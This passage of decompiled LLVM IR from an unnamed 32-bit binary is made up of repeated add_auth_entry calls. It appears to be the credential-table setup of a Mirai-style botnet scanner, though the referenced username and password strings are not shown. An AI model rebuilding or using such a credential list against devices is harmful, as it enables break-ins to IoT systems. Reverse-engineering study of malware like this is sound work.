  store i32 ptrtoint ([9 x i8]* @global_var_1b4dc.266 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_fe08 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b4dc.266 to i32), i32 12)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4e8.268 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fe18 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b4e8.268 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4f8.270 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fe28 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b4f8.270 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b508.272 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe38 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b508.272 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b510.274 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe48 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b510.274 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b518.276 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe58 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b518.276 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe68 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b524.278 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_fe78 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b524.278 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b52c.280 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_fe88 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b52c.280 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b538.282 to i32), i32* %r1.global-to-local, align 4
  %v0_fe94 = load i32, i32* @r4, align 4
  store i32 %v0_fe94, i32* %r2.global-to-local, align 4
  %v4_fe98 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b538.282 to i32), i32 %v0_fe94)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b540.284 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fea8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b540.284 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b804.214 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_feb8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b804.214 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b40c.218 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fec8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b40c.218 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3f0.210 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fed8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b3f0.210 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fee8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4f8.270 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fef8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b4f8.270 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b548.286 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_ff08 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b548.286 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b41c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_ff18 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b41c.222 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b45c.236 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_ff28 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b45c.236 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b3e0.288 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_ff38 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b3e0.288 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b554.290 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_ff48 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b554.290 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b560.292 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_ff58 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b560.292 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b568.294 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_ff68 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b568.294 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b56c.296 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_ff78 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b56c.296 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b574.298 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_ff88 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b574.298 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b580.300 to i32), i32* %r1.global-to-local, align 4
  %v0_ff94 = load i32, i32* @r4, align 4
  store i32 %v0_ff94, i32* %r2.global-to-local, align 4
  %v5_ff98 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b580.300 to i32), i32 %v0_ff94)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b588.302 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_ffa8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b588.302 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b594.304 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_ffb8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b594.304 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b59c.306 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_ffc8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b59c.306 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5a4.308 to i32), i32* %r1.global-to-local, align 4
  %v0_ffd4 = load i32, i32* @r4, align 4
  store i32 %v0_ffd4, i32* %r2.global-to-local, align 4
  %v4_ffd8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b5a4.308 to i32), i32 %v0_ffd4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5ac.310 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_ffe8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b5ac.310 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b5b4.312 to i32), i32* %r1.global-to-local, align 4
  %v0_fff4 = load i32, i32* @r4, align 4
  store i32 %v0_fff4, i32* %r2.global-to-local, align 4
  %v5_fff8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b5b4.312 to i32), i32 %v0_fff4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b5bc.314 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10008 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b5bc.314 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5c4.316 to i32), i32* %r1.global-to-local, align 4
  %v0_10014 = load i32, i32* @r4, align 4
  store i32 %v0_10014, i32* %r2.global-to-local, align 4
  %v4_10018 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b5c4.316 to i32), i32 %v0_10014)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b468.240 to i32), i32* %r1.global-to-local, align 4
  %v0_10024 = load i32, i32* @r4, align 4
  store i32 %v0_10024, i32* %r2.global-to-local, align 4
  %v5_10028 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b468.240 to i32), i32 %v0_10024)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5cc.318 to i32), i32* %r1.global-to-local, align 4
  %v0_10034 = load i32, i32* @r4, align 4
  store i32 %v0_10034, i32* %r2.global-to-local, align 4
  %v4_10038 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b5cc.318 to i32), i32 %v0_10034)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b5d4.320 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10048 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b5d4.320 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b5dc.322 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10058 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b5dc.322 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b5e8.324 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b5e8.324 to i32), i32* %r1.global-to-local, align 4
  %v5_10068 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b5e8.324 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b5e8.324 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b3e0.288 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b3e0.288 to i32), i32* %r1.global-to-local, align 4
  %v5_10078 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b3e0.288 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b3e0.288 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b3e0.288 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10088 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b3e0.288 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b6e0.326 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10098 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b6e0.326 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b5f0.328 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_100a8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b5f0.328 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b5f8.330 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_100b8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b5f8.330 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b5f8.330 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b5f8.330 to i32), i32* %r1.global-to-local, align 4
  %v5_100c8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b5f8.330 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b5f8.330 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_1b600.332 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_100d8 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b600.332 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 3)
  store i32 ptrtoint ([8 x i8]* @global_var_1b604.334 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b60c.336 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_100e8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b604.334 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b60c.336 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_1b614.338 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b614.338 to i32), i32* %r1.global-to-local, align 4
  %v5_100f8 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b614.338 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b614.338 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b618.340 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10108 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b618.340 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b624.342 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_10118 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b624.342 to i32), i32 4)
  store i32 ptrtoint ([7 x i8]* @global_var_1b62c.344 to i32), i32* %r0.global-to-local, align 4
  %v0_10120 = load i32, i32* @r4, align 4
  store i32 %v0_10120, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b62c.344 to i32), i32* %r1.global-to-local, align 4
  %v5_10128 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b62c.344 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b62c.344 to i32), i32 %v0_10120)
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b62c.344 to i32), i32* %r1.global-to-local, align 4
  %v0_10134 = load i32, i32* @r4, align 4
  store i32 %v0_10134, i32* %r2.global-to-local, align 4
  %v4_10138 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b62c.344 to i32), i32 %v0_10134)
  store i32 ptrtoint (i32* @global_var_1b634.346 to i32), i32* %r0.global-to-local, align 4
  %v0_10140 = load i32, i32* @r4, align 4
  store i32 %v0_10140, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b634.346 to i32), i32* %r1.global-to-local, align 4
  %v3_10148 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b634.346 to i32), i32 ptrtoint (i32* @global_var_1b634.346 to i32), i32 %v0_10140)
  store i32 ptrtoint ([6 x i8]* @global_var_1b63c.348 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_10158 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b63c.348 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b644.350 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10168 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b644.350 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b644.350 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b41c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10178 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b644.350 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b41c.222 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b644.350 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_10188 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b644.350 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 5)
  store i32 ptrtoint (i32* @global_var_1b64c.352 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v3_10198 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b64c.352 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 5)
  store i32 ptrtoint ([9 x i8]* @global_var_1b654.354 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b660.356 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_101a8 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b654.354 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b660.356 to i32), i32 8)
  store i32 ptrtoint ([8 x i8]* @global_var_1b668.358 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b668.358 to i32), i32* %r1.global-to-local, align 4
  %v5_101b8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b668.358 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b668.358 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_1b670.360 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b670.360 to i32), i32* %r1.global-to-local, align 4
  %v5_101c8 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b670.360 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b670.360 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_1b670.360 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b678.362 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_101d8 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b670.360 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b678.362 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b680.364 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1b688.366 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_101e8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b680.364 to i32), i32 ptrtoint ([10 x i8]* @global_var_1b688.366 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_1b680.364 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b5d4.320 to i32), i32* %r1.global-to-local, align 4
  %v0_101f4 = load i32, i32* @r4, align 4
  store i32 %v0_101f4, i32* %r2.global-to-local, align 4
  %v5_101f8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b680.364 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b5d4.320 to i32), i32 %v0_101f4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b694.368 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b694.368 to i32), i32* %r1.global-to-local, align 4
  %v5_10208 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b694.368 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b694.368 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b69c.370 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b6a4.372 to i32), i32* %r1.global-to-local, align 4
  %v0_10214 = load i32, i32* @r4, align 4
  store i32 %v0_10214, i32* %r2.global-to-local, align 4
